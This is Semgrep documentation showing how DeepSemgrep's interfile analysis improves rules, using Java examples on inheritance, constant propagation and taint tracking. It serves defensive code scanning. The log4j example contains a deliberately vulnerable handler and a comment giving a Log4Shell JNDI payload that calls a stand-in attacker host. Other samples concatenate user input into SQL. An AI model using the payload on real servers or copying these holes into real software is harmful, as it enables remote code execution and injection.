---
slug: deepsemgrep
description: "This document provides an overview of DeepSemgrep use cases, such as use of DeepSemgrep in type inferences, class inheritance, constant propagation, taint analysis."
---

# DeepSemgrep

## Introduction

Improve your scan results for entire codebases with interfile coding paradigms using DeepSemgrep instead of Semgrep's regular intrafile (within-a-single-file) approach. In most object-oriented programming styles, it is expected that classes are in different files. DeepSemgrep empowers you to easily scan whole repositories with classes in different files to find vulnerabilities in your code. DeepSemgrep is a proprietary extension of free and open source Semgrep which leverages global analysis tools, and uses the same rules as Semgrep.

This document demonstrates the utility of DeepSemgrep through use cases, guiding you through examples of Semgrep rules that you can use to search for particular patterns in code. Both Semgrep rules and code on which rules are tested are marked as code snippets and introduced always as a rule, code, or file used to illustrate the capabilities of DeepSemgrep.

## Obtaining DeepSemgrep

To get DeepSemgrep, follow these steps:
1. Submit your email using the [DeepSemgrep beta form](https://semgrep.dev/deep-semgrep-beta).
2. Follow the steps and instructions in the email you receive from the Semgrep team.
3. Start using DeepSemgrep with the following command:
    ```sh
    semgrep login
    ```
4. Use a link that Semgrep prints to the command-line.
5. Use the following commands:
    ```sh
    semgrep install-deep-semgrep
    ```

    And then:
    ```sh
    semgrep --deep --config=myrule.yaml
    ```

Use DeepSemgrep in command-line with `semgrep --deep`.

## Type inference and class inheritance

### Class inheritance

This section compares the possible findings of a scan across multiple files using Semgrep and DeepSemgrep.

To scan for methods that throw a particular exception, `ExampleException`, use the following rule:

```yaml
rules:
- id: throw-exception-example
  pattern: |
       throw new ExampleException(...);
  message: Throwing an ExampleException
  languages: [java]
  severity: ERROR
```

This rule matches code that throws `ExampleException` but not `BadRequest`:

```java
package example;

public class App {
    public void check(String s) {
        if (is_bad(s)) {
            // rule-id: throw-exception-example
            throw new ExampleException(s);
        }
    }

    public void check2(String s) {
        if (is_bad(s)) {
            // ok: throw-exception-example
            throw new BadRequest(s);
        }
    }
}
```

Test an interactive example in the [Playground](https://semgrep.dev/s/emjin:throw-exception-example).

Now consider the case where `BadRequest` extends `ExampleException`:

File 1:
```java
package example;

public class ExampleException extends Exception {

    public ExampleException(String exception) {
        super(exception);
    }
}
```

File 2:
```java
package example; 

class BadRequest extends ExampleException {
  public BadRequest(String exception) {
    super(exception);
  }
}
```

It’s now necessary to change the rule to detect instances where `BadRequest` is thrown:

```java
package example;

public class App {
    public void check(String s) {
        if (is_bad(s)) {
            // rule-id: throw-exception-example
            throw new ExampleException(s);
        }
    }

    public void check2(String s) {
        if (is_bad(s)) {
            // rule-id: throw-exception-example
            throw new BadRequest(s);
        }
    }
}
```

#### Using fully-qualified name in DeepSemgrep

To make the rule more precise, DeepSemgrep allows you to use fully-qualified names. To detect instances where `BadRequest` is thrown, run DeepSemgrep. Considering that the original Semgrep rule is run interfile, to disambiguate `ExampleException` from other exceptions that can have the same name, amend the rule to search for `example.ExampleException`:

Rule:
```yaml
rules:
- id: throw-exception-example
  pattern: |
       throw new example.ExampleException(...);
  message: Throwing an ExampleException
  languages: [java]
  severity: ERROR
```

Now, if you run this rule with DeepSemgrep, both thrown exceptions displayed above are matched!

### Using class inheritance with typed metavariables

To search for variables of a certain class, Semgrep enables you to scan for [typed metavariables](https://semgrep.dev/docs/writing-rules/pattern-syntax/#typed-metavariables) in several languages. The following rule has been written by the Semgrep community to check for vulnerability to the log4j exploit, Log4Shell.

Rule:
```yaml
rules:
- id: log4j2_tainted_argument
 patterns:
   - pattern-either:
     - pattern: (Logger $LOGGER).$METHOD($ARG);
     - pattern: (Logger $LOGGER).$METHOD($ARG,...);
   - pattern-inside: |
       import org.apache.log4j.$PKG;
       ...
   - pattern-not: (Logger $LOGGER).$METHOD("...");
 message: log4j $LOGGER.$METHOD tainted argument
 languages: [java]
 severity: WARNING
```

File:
```java
import org.apache.log4j.Logger;
import org.apache.log4j.LogManager;
import java.io.*;
import java.sql.SQLException;
import java.util.*;
 
 static Logger log;
  log = LogManager.getLogger(log4jExample.class.getName());
 
public class VulnerableLog4jExampleHandler implements HttpHandler {
 
 
 /**
  * A simple HTTP endpoint that reads the request's User Agent and logs it back.
  * This is pseudo-code to explain the vulnerability, and not a full example.
  * @param he HTTP Request Object
  */
 public void handle(HttpExchange he) throws IOException {
   string userAgent = he.getRequestHeader("user-agent");
   // ruleid: log4j2_tainted_argument
   log.info("Request User Agent:" + "" + userAgent);
   log.info("Request User Agent:" + "");
   // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.
   // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}
   // ruleid: log4j2_tainted_argument
   log.info("Request User Agent:" + userAgent);
 
   String response = "<h1>Hello There, " + userAgent + "!</h1>";
   he.sendResponseHeaders(200, response.length());
   OutputStream os = he.getResponseBody();
   os.write(response.getBytes());
   os.close();
 }
}
 
public class main{
   public static final Logger logger;
 
   logger = LogManager.getLogger(someClass.class);
   public static void someFunc(int arg1, String bad, String somestr){
     // ruleid: log4j2_tainted_argument
       logger.error(String.Format("foo biz {}",bad));
   }
}
```

Test an interactive example in the [Playground](https://semgrep.dev/s/chegg:log4j2_tainted_argument).

This rule searches for any function called by an object of type `Logger`, using the restriction within an import for `org.apache.log4j.<ANYTHING>` to make sure that logger is a vulnerable log4j logger.

The log4j rule illustrates the use of typed metavariables in Semgrep. With DeepSemgrep you may achieve higher fidelity findings for the following reasons:

If another class extends the log4j `Logger`, as shown before, DeepSemgrep still detects it. If you have a safe wrapper, you can modify the rule to exclude matches using the safe wrapper class to avoid false positives.
If the `Logger` object is created by a factory method in another class, DeepSemgrep still detects it.

#### Using fully-qualified name in DeepSemgrep

To make the rule more precise, DeepSemgrep allows you to use fully-qualified names. This also makes the rule a little prettier by eliminating the `pattern-inside`!

Rule:
```yaml
rules:
- id: log4j2_tainted_argument
  patterns:
    - pattern-either:
      - pattern: (org.apache.log4j.Logger $LOGGER).$METHOD($ARG);
      - pattern: (org.apache.log4j.Logger $LOGGER).$METHOD($ARG,...);
    - pattern-not: (org.apache.log4j.Logger $LOGGER).$METHOD("...");
  message: log4j $LOGGER.$METHOD tainted argument
  languages: [java]
  severity: WARNING
```

With DeepSegremp, this rule finds the use of any instance of log4j’s `Logger` class.

Allowing typed metavariables to access information from the entire program enables users to query any variable for its type and use that information in conjunction with the rest of the code resulting in more accurate findings.

## Constant propagation

### Finding dangerous calls

[Constant propagation](https://semgrep.dev/docs/writing-rules/data-flow/constant-propagation/) provides a syntax for eliminating false positives in Semgrep rules. Even if a variable is set to a constant before being used in a function call several lines below, Semgrep knows that it must have that value and matches the function call. DeepSemgrep does not use the dataflow engine for constant propagation. For more information, see [Pattern Syntax](https://semgrep.dev/docs/writing-rules/pattern-syntax/#constants)

For example, this rule looks for non-constant values passed to the `dangerous` function:

Rule:
```yaml
rules:
- id: dangerous-call
  patterns:
    - pattern: dangerous(...)
    - pattern-not: dangerous("...")
  message: Call of dangerous on non-constant value
  languages: [java]
  severity: WARNING
```

File:
```java
package com.example;
import com.main.Constants.EMPLOYEE_TABLE_NAME;

public class App {

    public void example(String user_input) {

        // rule-id: dangerous-call
        dangerous("Select * FROM " + user_input);

        // rule-id: dangerous-call
        dangerous("Select * FROM " + EMPLOYEE_TABLE_NAME);
        
        String table_name = "Employees";
        // ok:        
        dangerous("Select * FROM " + table_name);

        // ok:
        dangerous("Select * FROM Employees");
    }

}
```

Test an interactive example in the [Playground](https://semgrep.dev/s/emjin:dangerous-call).

This matches the first and second calls because Semgrep does not understand a constant value for either `user_input` or `EMPLOYEE_TABLE_NAME`. However, `EMPLOYEE_TABLE_NAME` is imported from a global constants file with the following content.

Global constants file:
```java
package example;

public final class Constants {
    public static final double PI = 3.14159;
    public static final double PLANCK_CONSTANT = 6.62606896e-34;
    public static final String EMPLOYEE_TABLE_NAME = "Employees";
}
```

You do not need any changes to this rule in DeepSemgrep, and it matches only the first call.

### Propagating values

In this example, the string was constant, expressed with `”...”`, but constant propagation also propagates the constant value. We changed the previous rule to search for calls to `dangerous("Select * FROM Employees");`

```yaml
rules:
- id: dangerous-call-to-employees
  patterns:
    - pattern: dangerous("Select * FROM Employees")
  message: Call of dangerous on employees table
  languages: [java]
  severity: WARNING
```

With DeepSemgrep, this rule matches the last three calls to `dangerous`, since these calls are selected from the `Employees` table, though each one obtains the table name differently:

```java
package com.example;
import com.main.Constants.EMPLOYEE_TABLE_NAME;

public class App {

    public void example(String user_input) {

        // ok:
        dangerous("Select * FROM " + user_input);

        // rule-id: dangerous-call-to-employees
        dangerous("Select * FROM " + EMPLOYEE_TABLE_NAME);
        
        String table_name = "Employees";
        // rule-id: dangerous-call-to-employees   
        dangerous("Select * FROM " + table_name);

        // rule-id: dangerous-call-to-employees
        dangerous("Select * FROM Employees");
    }

}
```

## Taint tracking

Constant versus non-constant is not the only distinction to be made about a value. Semgrep allows you to search for the flow of any potentially exploitable input into an important sink using taint mode. For more information, see [taint mode](https://semgrep.dev/docs/writing-rules/data-flow/taint-mode/) documentation.

To continue with the previous example, look for dangerous calls using data obtained by calling `get_user_input`. The rule does this by specifying the source of taint as `get_user_input(...)` and the sink as `dangerous(...);`.

Rule:
```yaml
rules:
- id: dangerous-taint
 mode: taint
 pattern-sources:
   - pattern: get_user_input(...);
 pattern-sinks:
   - pattern: dangerous(...);
 message: Call of dangerous on tainted value
 languages: [java]
 severity: WARNING
```

Modify our previous file a bit.

File:
```java
package com.example;
 
public class App {
 
   public void read_input() {
       return trim(get_user_input("example"));
   }
 
   public void example(String safe_input) {
       String user_input = get_user_input("example");
       String still_user_input = read_input();
 
       // rule-id: dangerous-call
       dangerous("Select * FROM " + user_input);
 
       // rule-id: dangerous-call
       dangerous("Select * FROM " + still_user_input);
 
       // ok:       
       dangerous("Select * FROM " + safe_input);
   }
 
}
```

Test the example in the [Playground](https://semgrep.dev/s/emjin:dangerous-taint).

Comparing DeepSemgrep to Semgrep, Semgrep can be misled in this example. If `read_input` was in another file, it would be impossible for Semgrep to know that `read_input` had called `get_user_input`. Of course, the rule could include `read_input` as another source, but if wrappers are being written frequently this might not be a good approach.

With DeepSemgrep, the taint rule can track calls to `get_user_input` over multiple jumps in multiple files. It can also handle more complicated situations with sources and sinks. Since DeepSemgrep rules are just Semgrep rules, the normal taint documentation is a good explanation of those.

## Appendix

### Difference between DeepSemgrep and join mode

DeepSemgrep is different from [join mode](https://semgrep.dev/docs/experiments/join-mode/overview/), which also allows you to perform interfile analyses by letting you join on the metavariable matches in separate rules.

### Future development of DeepSemgrep

We’re excited to hear what’s on your mind. As users explore the limits of DeepSemgrep, we want to know what they’re failing to express. We believe that interfile type inference, constant propagation, and taint tracking combined allow users to express most restrictions on a program and enforce them quickly.

### Supported languages

DeepSemgrep now supports Java and Ruby.
